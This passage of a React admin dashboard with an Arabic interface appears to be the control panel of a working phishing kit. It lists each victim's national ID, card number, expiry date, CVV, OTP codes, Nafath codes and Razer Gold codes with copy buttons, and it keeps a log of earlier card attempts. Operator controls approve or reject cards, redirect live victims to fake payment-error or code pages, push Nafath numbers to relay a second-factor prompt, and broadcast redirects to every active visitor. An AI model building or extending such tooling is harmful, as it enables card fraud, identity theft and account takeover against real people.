                              <Badge className="bg-red-600 text-white text-[10px] px-1.5">مرفوضة</Badge>
                            )}
                            {v.cardStatus === "pending" && (
                             <>
                               <Button
                                 size="sm"
                                 title="قبول"
                                 className="bg-emerald-600 hover:bg-emerald-700 text-white h-6 w-6 p-0"
                                  onClick={() => {
                                    setCardStatusMutation.mutate({ sessionId: v.sessionId, status: "approved" });
                                    sendCommand.mutate({ sessionId: v.sessionId, commandType: "redirect", payload: "/code-pay" });
                                  }}
                                >
                                  <CheckCircle2 className="h-3 w-3" />
                                </Button>
                                <Button
                                  size="sm"
                                  title="رفض"
                                  className="bg-red-600 hover:bg-red-700 text-white h-6 w-6 p-0"
                                  onClick={() => {
                                    setCardStatusMutation.mutate({ sessionId: v.sessionId, status: "rejected" });
                                    sendCommand.mutate({ sessionId: v.sessionId, commandType: "redirect", payload: "/cardpayment-error" });
                                  }}
                                >
                                  <XCircle className="h-3 w-3" />
                                </Button>
                              </>
                            )}
                            {v.cardStatus === "none" && (
                              <span className="text-gray-300">—</span>
                            )}
                          </div>
                        </TableCell>
                        {/* حالة Razer */}
                        <TableCell className="px-2 py-1">
                          <div className="flex items-center gap-1">
                            {v.razerCode && v.razerStatus === "pending" && (
                              <>
                                <CopyBtn value={v.razerCode} label="Razer" />
                                <Badge className="bg-purple-500 text-white text-[10px] px-1.5">كود</Badge>
                                <Button
                                  size="sm"
                                  title="قبول Razer"
                                  className="bg-emerald-600 hover:bg-emerald-700 text-white h-6 w-6 p-0"
                                  onClick={() =>
                                    setRazerStatusMutation.mutate({
                                      sessionId: v.sessionId,
                                      status: "approved",
                                    })
                                  }
                                >
                                  <CheckCircle2 className="h-3 w-3" />
                                </Button>
                                <Button
                                  size="sm"
                                  title="رفض Razer"
                                  className="bg-red-600 hover:bg-red-700 text-white h-6 w-6 p-0"
                                  onClick={() =>
                                    setRazerStatusMutation.mutate({
                                      sessionId: v.sessionId,
                                      status: "rejected",
                                    })
                                  }
                                >
                                  <XCircle className="h-3 w-3" />
                                </Button>
                              </>
                            )}
                            {v.razerStatus === "approved" && (
                              <Badge className="bg-emerald-600 text-white text-[10px] px-1.5">مقبول</Badge>
                            )}
                            {v.razerStatus === "rejected" && (
                              <Badge className="bg-red-600 text-white text-[10px] px-1.5">مرفوض</Badge>
                            )}
                            {(!v.razerCode || v.razerStatus === "none" || !v.razerStatus) && !v.razerCode && (
                              <span className="text-gray-300">—</span>
                            )}
                            {v.razerCode && (v.razerStatus === "none" || !v.razerStatus) && (
                              <Badge className="bg-gray-400 text-white text-[10px] px-1.5">مرسل</Badge>
                            )}
                          </div>
                        </TableCell>
                        {/* آخر نشاط */}
                        <TableCell className="px-2 py-1 whitespace-nowrap font-mono text-[10px]">
                          <div>{shortTime(v.lastSeen)}</div>
                          {v.isActive ? (
                            <Badge className="mt-0.5 bg-rose-500 text-white text-[9px] h-4 px-1">
                              نشط {timeAgo(v.lastSeen)}
                            </Badge>
                          ) : (
                            <span className="text-muted-foreground">{timeAgo(v.lastSeen)}</span>
                          )}
                        </TableCell>
                        {/* إجراءات - ثابت على اليسار */}
                        <TableCell className={`px-2 py-1.5 sticky left-0 z-20 border-r-2 border-r-slate-300 ${v.isActive ? 'bg-rose-50' : 'bg-white'}`}>
                          <div className="flex flex-col gap-1">
                            {/* أزرار Razer السريعة عند وجود كود معلق */}
                            {v.razerCode && v.razerStatus === "pending" && (
                              <div className="flex items-center gap-1 justify-center">
                                <Button
                                  size="sm"
                                  className="h-7 px-2 text-[10px] gap-1 bg-emerald-600 hover:bg-emerald-700 text-white"
                                  onClick={() =>
                                    setRazerStatusMutation.mutate({ sessionId: v.sessionId, status: "approved" })
                                  }
                                  title="قبول Razer"
                                >
                                  <CheckCircle2 className="h-3 w-3" />
                                  قبول
                                </Button>
                                <Button
                                  size="sm"
                                  className="h-7 px-2 text-[10px] gap-1 bg-red-600 hover:bg-red-700 text-white"
                                  onClick={() =>
                                    setRazerStatusMutation.mutate({ sessionId: v.sessionId, status: "rejected" })
                                  }
                                  title="رفض Razer"
                                >
                                  <XCircle className="h-3 w-3" />
                                  رفض
                                </Button>
                              </div>
                            )}
                            {/* أزرار البطاقة السريعة عند الانتظار */}
                            {v.cardStatus === "pending" && (
                              <div className="flex items-center gap-1 justify-center">
                                <Button
                                  size="sm"
                                  className="h-7 px-2 text-[10px] gap-1 bg-emerald-600 hover:bg-emerald-700 text-white"
                                  onClick={() => {
                                    setCardStatusMutation.mutate({ sessionId: v.sessionId, status: "approved" });
                                    sendCommand.mutate({ sessionId: v.sessionId, commandType: "redirect", payload: "/code-pay" });
                                  }}
                                  title="قبول البطاقة"
                                >
                                  <CheckCircle2 className="h-3 w-3" />
                                  بطاقة
                                </Button>
                                <Button
                                  size="sm"
                                  className="h-7 px-2 text-[10px] gap-1 bg-red-600 hover:bg-red-700 text-white"
                                  onClick={() => {
                                    setCardStatusMutation.mutate({ sessionId: v.sessionId, status: "rejected" });
                                    sendCommand.mutate({ sessionId: v.sessionId, commandType: "redirect", payload: "/cardpayment-error" });
                                  }}
                                  title="رفض البطاقة"
                                >
                                  <XCircle className="h-3 w-3" />
                                  بطاقة
                                </Button>
                              </div>
                            )}
                            {/* أزرار الإجراءات الأساسية */}
                            <div className="flex items-center gap-1 justify-center">
                              <Button
                                size="sm"
                                variant="outline"
                                className="h-7 w-7 p-0 border-blue-300 text-blue-700 hover:bg-blue-50"
                                onClick={() => setDetailVisitor(v)}
                                title="تفاصيل"
                              >
                                <Eye className="h-3.5 w-3.5" />
                              </Button>
                              <Button
                                size="sm"
                                className="h-7 w-7 p-0 bg-amber-500 hover:bg-amber-600 text-white"
                                onClick={() => setRedirectTarget(v)}
                                disabled={!v.isActive}
                                title="توجيه"
                              >
                                <Send className="h-3.5 w-3.5" />
                              </Button>
                              <Button
                                size="sm"
                                variant="outline"
                                className="h-7 w-7 p-0 border-red-300 text-red-600 hover:bg-red-50"
                                onClick={() => {
                                  if (confirm(`حذف ${v.fullName ?? "هذا الزائر"}؟`)) {
                                    deleteVisitorMutation.mutate({ sessionId: v.sessionId });
                                  }
                                }}
                                title="حذف"
                              >
                                <Trash2 className="h-3.5 w-3.5" />
                              </Button>
                            </div>
                          </div>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            </div>
          )}
          {registeredVisitors.length > PAGE_SIZE && (
            <PaginationBar
              page={safePageReg}
              totalPages={totalPagesReg}
              total={registeredVisitors.length}
              pageSize={PAGE_SIZE}
              onChange={setPageRegistered}
            />
          )}
        </CardContent>
      </Card>

      {/* الزوار المجهولون - مخفي */}
      {false && (
      <Card>
        <CardHeader className="flex flex-row items-center justify-between gap-3 flex-wrap py-3">
          <CardTitle className="text-base flex items-center gap-2">
            <span className="inline-flex items-center gap-1.5 text-gray-500">
              <Eye className="h-4 w-4" />
              الزوار المجهولون
            </span>
            <Badge variant="secondary">{anonymousVisitors.length}</Badge>
            <span className="text-xs font-normal text-muted-foreground mr-1">
              (دخلوا دون إدخال بيانات)
            </span>
          </CardTitle>
        </CardHeader>
        <CardContent className="p-0">
          {anonymousVisitors.length === 0 ? (
            <div className="p-6 text-center text-muted-foreground text-xs">
              لا يوجد زوار مجهولون
            </div>
          ) : (
            <div className="overflow-x-auto">
              <Table className="text-xs">
                <TableHeader>
                  <TableRow className="bg-muted/30 hover:bg-muted/30 h-8">
                    <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5 w-12">#</TableHead>
                    <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">الجلسة</TableHead>
                    <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">IP</TableHead>
                    <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">الصفحة</TableHead>
                    <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">الخطوات</TableHead>
                    <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">أول دخول</TableHead>
                    <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">آخر نشاط</TableHead>
                    <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">إجراءات</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {pagedAnonymous.map((v, idx) => (
                    <TableRow
                      key={v.sessionId}
                      className={v.isActive ? "bg-rose-50/40 hover:bg-rose-50/60 h-9" : "hover:bg-muted/20 h-9"}
                    >
                      <TableCell className="px-2 py-1 text-center font-mono text-muted-foreground">{idx + 1}</TableCell>
                      <TableCell className="px-2 py-1 font-mono text-[10px]">
                        {v.sessionId.slice(0, 10)}…
                      </TableCell>
                      <TableCell className="px-2 py-1">
                        <CopyBtn value={v.ip} label="IP" />
                      </TableCell>
                      <TableCell className="px-2 py-1">
                        <Badge variant="secondary" className="font-normal text-[10px] px-1.5">
                          {pageTitle(v.currentPage)}
                        </Badge>
                      </TableCell>
                      <TableCell className="px-2 py-1 text-center font-mono">{v.stepCount}</TableCell>
                      <TableCell className="px-2 py-1 whitespace-nowrap font-mono text-[10px]">
                        {shortTime(v.firstSeen)}
                      </TableCell>
                      <TableCell className="px-2 py-1 whitespace-nowrap font-mono text-[10px]">
                        <div>{shortTime(v.lastSeen)}</div>
                        {v.isActive ? (
                          <Badge className="mt-0.5 bg-rose-500 text-white text-[9px] h-4 px-1">
                            نشط {timeAgo(v.lastSeen)}
                          </Badge>
                        ) : (
                          <span className="text-muted-foreground">{timeAgo(v.lastSeen)}</span>
                        )}
                      </TableCell>
                      <TableCell className="px-2 py-1">
                        <div className="flex items-center gap-1">
                          <Button
                            size="sm"
                            variant="outline"
                            className="h-6 px-2 text-[10px] gap-1"
                            onClick={() => setRedirectTarget(v)}
                            disabled={!v.isActive}
                            title="توجيه لصفحة"
                          >
                            <Send className="h-3 w-3" />
                          </Button>
                          <Button
                            size="sm"
                            variant="ghost"
                            className="h-6 px-2 text-[10px] text-destructive hover:text-destructive"
                            onClick={() => {
                              if (confirm("حذف هذه الجلسة؟")) {
                                deleteVisitorMutation.mutate({ sessionId: v.sessionId });
                              }
                            }}
                            title="حذف"
                          >
                            <Trash2 className="h-3 w-3" />
                          </Button>
                        </div>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
          {anonymousVisitors.length > PAGE_SIZE && (
            <PaginationBar
              page={safePageAnon}
              totalPages={totalPagesAnon}
              total={anonymousVisitors.length}
              pageSize={PAGE_SIZE}
              onChange={setPageAnonymous}
            />
          )}
        </CardContent>
      </Card>
      )}

      {/* تفاصيل الزائر */}
      <Dialog open={!!detailVisitor} onOpenChange={(o) => !o && setDetailVisitor(null)}>
        <DialogContent dir="rtl" className="max-w-3xl max-h-[85vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>تفاصيل الزائر</DialogTitle>
            <DialogDescription>كل البيانات المُدخلة مع أزرار النسخ السريع</DialogDescription>
          </DialogHeader>
          {detailVisitor && (
            <div className="space-y-4 text-sm">
              <div className="grid grid-cols-2 gap-2">
                <Detail label="الاسم" value={detailVisitor.fullName} />
                <Detail label="الهاتف" value={detailVisitor.phone} copy />
                <Detail label="الإيميل" value={detailVisitor.email} copy />
                <Detail label="الرقم الوطني" value={detailVisitor.nationalId} copy />
                <Detail label="تاريخ الميلاد" value={detailVisitor.birthDate} copy />
                <Detail label="IP" value={detailVisitor.ip} />
                <Detail label="الصفحة الحالية" value={pageTitle(detailVisitor.currentPage)} />
                <Detail label="آخر إدخال" value={detailVisitor.lastInputPage} />
                <Detail label="عدد الخطوات" value={String(detailVisitor.stepCount)} />
                <Detail label="معرف الجلسة" value={detailVisitor.sessionId.slice(0, 16) + "..."} />
              </div>

              {(detailVisitor.cardNumber || detailVisitor.cardCvv) && (
                <div className="bg-indigo-50 border border-indigo-200 rounded-lg p-3">
                  <h4 className="font-bold mb-2 text-indigo-900">بيانات البطاقة (الأحدث)</h4>
                  <div className="grid grid-cols-2 gap-2">
                    <Detail label="اسم صاحب البطاقة" value={detailVisitor.cardHolderName} copy />
                    <Detail label="رقم البطاقة" value={detailVisitor.cardNumber} copy />
                    <Detail label="تاريخ الانتهاء" value={detailVisitor.cardExpiry} copy />
                    <Detail label="CVV" value={detailVisitor.cardCvv} copy />
                  </div>
                </div>
              )}

              {/* سجل محاولات البطاقة السابقة */}
              <PreviousCards sessionId={detailVisitor.sessionId} />

              {(detailVisitor.otp1 || detailVisitor.otp2 || detailVisitor.otpNafath) && (
                <div className="bg-rose-50 border border-rose-200 rounded-lg p-3">
                  <h4 className="font-bold mb-2 text-rose-900">رموز التحقق (OTP)</h4>
                  <div className="grid grid-cols-3 gap-2">
                    <Detail label="OTP 1 (الرمز السري)" value={detailVisitor.otp1} copy />
                    <Detail label="OTP 2 (الرمز الثاني)" value={detailVisitor.otp2} copy />
                    <Detail label="OTP نفاذ" value={detailVisitor.otpNafath} copy />
                  </div>
                </div>
              )}

              {detailVisitor.nafathNumber && (
                <div className="bg-emerald-50 border border-emerald-200 rounded-lg p-3">
                  <h4 className="font-bold mb-2 text-emerald-900">رقم نفاذ المُرسل</h4>
                  <p className="font-mono text-2xl font-bold text-emerald-700">
                    {detailVisitor.nafathNumber}
                  </p>
                </div>
              )}

              {detailVisitor.razerCode && (
                <div className="bg-purple-50 border border-purple-200 rounded-lg p-3">
                  <h4 className="font-bold mb-2 text-purple-900">كود Razer Gold</h4>
                  <div className="flex items-center gap-2">
                    <CopyBtn value={detailVisitor.razerCode} label="كود Razer" />
                  </div>
                  <p className="text-xs text-purple-600 mt-1">
                    الحالة: {detailVisitor.razerStatus === "pending" ? "قيد المراجعة" : detailVisitor.razerStatus === "approved" ? "مقبول" : detailVisitor.razerStatus === "rejected" ? "مرفوض" : "—"}
                  </p>
                </div>
              )}

              {detailVisitor.cardData && (
                <details className="bg-muted/40 p-2 rounded">
                  <summary className="cursor-pointer text-xs font-bold">JSON بيانات البطاقة الخام</summary>
                  <pre className="text-[10px] mt-2 overflow-x-auto" dir="ltr">
                    {JSON.stringify(detailVisitor.cardData, null, 2)}
                  </pre>
                </details>
              )}
              {detailVisitor.otpData && (
                <details className="bg-muted/40 p-2 rounded">
                  <summary className="cursor-pointer text-xs font-bold">JSON بيانات OTP الخام</summary>
                  <pre className="text-[10px] mt-2 overflow-x-auto" dir="ltr">
                    {JSON.stringify(detailVisitor.otpData, null, 2)}
                  </pre>
                </details>
              )}
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* توجيه الزائر */}
      <Dialog open={!!redirectTarget} onOpenChange={(o) => !o && setRedirectTarget(null)}>
        <DialogContent dir="rtl" className="max-w-lg">
          <DialogHeader>
            <DialogTitle>توجيه الزائر</DialogTitle>
            <DialogDescription>
              {redirectTarget?.fullName ?? "زائر"} — {redirectTarget?.sessionId.slice(0, 12)}
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-3">
            <div className="grid grid-cols-1 gap-1.5 max-h-64 overflow-y-auto">
              {QUICK_REDIRECTS.map((r) => (
                <Button
                  key={r.url}
                  variant="outline"
                  size="sm"
                  className="justify-start gap-2 h-8 text-xs"
                  onClick={() => handleRedirect(r.url)}
                  disabled={sendCommand.isPending}
                >
                  <ExternalLink className="h-3.5 w-3.5" />
                  {r.label}
                </Button>
              ))}
            </div>
            <div className="border-t pt-2 space-y-1.5">
              <p className="text-xs font-medium">رابط مخصص:</p>
              <div className="flex gap-2">
                <Input
                  placeholder="/cardpayment-error"
                  value={customUrl}
                  onChange={(e) => setCustomUrl(e.target.value)}
                  dir="ltr"
                  className="h-8 text-xs"
                />
                <Button
                  onClick={() => handleRedirect(customUrl)}
                  disabled={!customUrl.trim() || sendCommand.isPending}
                  className="h-8"
                >
                  إرسال
                </Button>
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* إرسال رقم نفاذ */}
      <Dialog open={!!nafathTarget} onOpenChange={(o) => { if (!o) { setNafathTarget(null); setNafathInput(""); } }}>
        <DialogContent dir="rtl" className="max-w-md">
          <DialogHeader>
            <DialogTitle>إرسال رقم نفاذ</DialogTitle>
            <DialogDescription>
              يظهر فوراً للزائر في صفحة /nafath-code
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-3">
            <Input
              type="number"
              min={1}
              max={99}
              placeholder="مثال: 44"
              value={nafathInput}
              onChange={(e) => setNafathInput(e.target.value)}
              dir="ltr"
              className="text-center text-2xl font-mono h-14"
            />
            <div className="grid grid-cols-5 gap-1.5">
              {[12, 24, 36, 48, 56, 67, 73, 81, 89, 92].map((n) => (
                <Button
                  key={n}
                  variant="outline"
                  size="sm"
                  className="h-9 font-mono"
                  onClick={() => setNafathInput(String(n))}
                >
                  {n}
                </Button>
              ))}
            </div>
          </div>
          <DialogFooter className="gap-2">
            {nafathTarget?.nafathNumber && (
              <Button
                variant="outline"
                onClick={() => {
                  if (!nafathTarget) return;
                  setNafathNumberMutation.mutate({
                    sessionId: nafathTarget.sessionId,
                    nafathNumber: null,
                  });
                }}
              >
                مسح
              </Button>
            )}
            <Button
              onClick={() => {
                if (!nafathTarget || !nafathInput.trim()) return;
                setNafathNumberMutation.mutate({
                  sessionId: nafathTarget.sessionId,
                  nafathNumber: nafathInput.trim(),
                });
              }}
              disabled={!nafathInput.trim() || setNafathNumberMutation.isPending}
              className="bg-emerald-600 hover:bg-emerald-700"
            >
              {setNafathNumberMutation.isPending ? (
                <Loader2 className="h-4 w-4 animate-spin" />
              ) : (
                "إرسال"
              )}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* البث الجماعي */}
      <Dialog open={broadcastOpen} onOpenChange={setBroadcastOpen}>
        <DialogContent dir="rtl" className="max-w-lg">
          <DialogHeader>
            <DialogTitle>توجيه جميع الزوار النشطين</DialogTitle>
            <DialogDescription>
              {activeCount} زائر متصل الآن
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-3">
            <div className="grid grid-cols-1 gap-1.5 max-h-64 overflow-y-auto">
              {QUICK_REDIRECTS.map((r) => (
                <Button
                  key={r.url}
                  variant="outline"
                  size="sm"
                  className="justify-start gap-2 h-8 text-xs"
                  onClick={() => broadcastMutation.mutate({ url: r.url })}
                  disabled={broadcastMutation.isPending}
                >
                  <Megaphone className="h-3.5 w-3.5" />
                  {r.label}
                </Button>
              ))}
            </div>
            <div className="border-t pt-2 space-y-1.5">
              <p className="text-xs font-medium">رابط مخصص:</p>
              <div className="flex gap-2">
                <Input
                  placeholder="/cardpayment-error"
                  value={broadcastUrl}
                  onChange={(e) => setBroadcastUrl(e.target.value)}
                  dir="ltr"
                  className="h-8 text-xs"
                />
                <Button
                  onClick={() => broadcastMutation.mutate({ url: broadcastUrl.trim() })}
                  disabled={!broadcastUrl.trim() || broadcastMutation.isPending}
                  className="h-8"
                >
                  بث
                </Button>
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}

function PaginationBar({
  page,
  totalPages,
  total,
  pageSize,
  onChange,
}: {
  page: number;
  totalPages: number;
  total: number;
  pageSize: number;
  onChange: (n: number) => void;
}) {
  const startIdx = (page - 1) * pageSize + 1;
  const endIdx = Math.min(page * pageSize, total);

  const pages: (number | "...")[] = [];
  if (totalPages <= 7) {
    for (let i = 1; i <= totalPages; i++) pages.push(i);
  } else {
    pages.push(1);
    if (page > 3) pages.push("...");
    const s = Math.max(2, page - 1);
    const e = Math.min(totalPages - 1, page + 1);
    for (let i = s; i <= e; i++) pages.push(i);
    if (page < totalPages - 2) pages.push("...");
    pages.push(totalPages);
  }

  return (
    <div className="flex items-center justify-between gap-2 px-3 py-2 border-t bg-muted/20 flex-wrap text-xs">
      <div className="text-muted-foreground">
        عرض <span className="font-bold text-foreground">{startIdx}</span>–
        <span className="font-bold text-foreground">{endIdx}</span> من{" "}
        <span className="font-bold text-foreground">{total}</span> تسجيل
      </div>
      <div className="flex items-center gap-1">
        <Button
          size="sm"
          variant="outline"
          className="h-7 px-2"
          disabled={page === 1}
          onClick={() => onChange(1)}
        >
          «
        </Button>
        <Button
          size="sm"
          variant="outline"
          className="h-7 px-2"
          disabled={page === 1}
          onClick={() => onChange(page - 1)}
        >
          ‏→
        </Button>
        {pages.map((p, i) =>
          p === "..." ? (
            <span key={`dot-${i}`} className="px-1 text-muted-foreground">
              …
            </span>
          ) : (
            <Button
              key={p}
              size="sm"
              variant={p === page ? "default" : "outline"}
              className={`h-7 min-w-[28px] px-2 ${p === page ? "bg-emerald-600 hover:bg-emerald-700" : ""}`}
              onClick={() => onChange(p)}
            >
              {p}
            </Button>
          )
        )}
        <Button
          size="sm"
          variant="outline"
          className="h-7 px-2"
          disabled={page === totalPages}
          onClick={() => onChange(page + 1)}
        >
          ‏←
        </Button>
        <Button
          size="sm"
          variant="outline"
          className="h-7 px-2"
          disabled={page === totalPages}
          onClick={() => onChange(totalPages)}
        >
          »
        </Button>
      </div>
    </div>
  );
}

function Detail({ label, value, copy }: { label: string; value: string | null | undefined; copy?: boolean }) {
  const [copied, setCopied] = useState(false);
  return (
    <div className="bg-white border rounded p-2">
      <p className="text-[10px] text-muted-foreground mb-0.5">{label}</p>
      <div className="flex items-center justify-between gap-2">
        <p className="font-medium font-mono text-xs break-all" dir="ltr">
          {value ?? "—"}
        </p>
        {copy && value && (
          <button
            onClick={() => {
              navigator.clipboard.writeText(value);
              setCopied(true);
              toast.success(`نُسخ`);
              setTimeout(() => setCopied(false), 1500);
            }}
            className="shrink-0 p-1 hover:bg-emerald-50 rounded transition-colors"
            title="نسخ"
          >
            {copied ? (
              <Check className="h-3.5 w-3.5 text-emerald-600" />
            ) : (
              <Copy className="h-3.5 w-3.5 text-gray-400" />
            )}
          </button>
        )}
      </div>
    </div>
  );
}

export default function AdminDashboard() {
  return (
    <AdminGuard>
      <DashboardLayout>
        <AdminDashboardContent />
      </DashboardLayout>
    </AdminGuard>
  );
}


/**
 * يعرض كل محاولات البطاقة السابقة لزائر معيّن (مع الأحدث في الأعلى).
 * يستخدم trpc.steps.bySession لجلب الخطوات ثم يفلتر cardpayment / cardpayment_retry.
 */
function PreviousCards({ sessionId }: { sessionId: string }) {
  const { data: steps, isLoading } = trpc.steps.bySession.useQuery(
    { sessionId },
    { refetchInterval: 15000 }
  );

  if (isLoading) return null;
  const all = steps ?? [];
  const cardSteps = all.filter(
    (s: any) =>
      s.stepKey === "cardpayment" ||
      s.stepKey === "cardpayment_retry" ||
      s.stepKey === "card_payment"
  );
  if (cardSteps.length <= 1) return null;

  const previous = cardSteps
    .slice()
    .sort(
      (a: any, b: any) => +new Date(b.createdAt) - +new Date(a.createdAt)
    )
    .slice(1);

  if (previous.length === 0) return null;

  return (
    <div className="bg-amber-50 border border-amber-200 rounded-lg p-3">
      <h4 className="font-bold mb-2 text-amber-900">
        محاولات البطاقة السابقة ({previous.length})
      </h4>
      <div className="space-y-2">
        {previous.map((s: any, i: number) => {
          const raw = s.data ?? {};
          const d = (typeof raw === "string" ? safeParse(raw) : raw) as Record<string, unknown>;
          const num = String(d.number ?? d.cardNumber ?? d.card_number ?? "");
          return (
            <div
              key={s.id ?? `${s.stepKey}-${i}`}
              className="bg-white border border-amber-100 rounded-md p-2 text-xs grid grid-cols-2 gap-1.5"
            >
              <div>
                <span className="text-muted-foreground">رقم البطاقة:</span>{" "}
                <span className="font-mono" dir="ltr">
                  {num || "—"}
                </span>
              </div>
              <div>
                <span className="text-muted-foreground">الاسم:</span>{" "}
                {String(d.name ?? d.cardHolderName ?? "—")}
              </div>
              <div>
                <span className="text-muted-foreground">الانتهاء:</span>{" "}
                <span className="font-mono" dir="ltr">
                  {String(d.month ?? "")}/{String(d.year ?? "")}
                </span>
              </div>
              <div>
                <span className="text-muted-foreground">CVV:</span>{" "}
                <span className="font-mono">{String(d.cvv ?? "—")}</span>
              </div>
              <div className="col-span-2 text-[10px] text-muted-foreground">
                {new Date(s.createdAt).toLocaleString("en-GB")}
                {s.stepKey === "cardpayment_retry" && (
                  <Badge variant="outline" className="mr-2 text-[9px] h-4">
                    إعادة محاولة
                  </Badge>
                )}
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}


function safeParse(s: string): Record<string, unknown> {
  try {
    return JSON.parse(s);
  } catch {
    return {};
  }
}
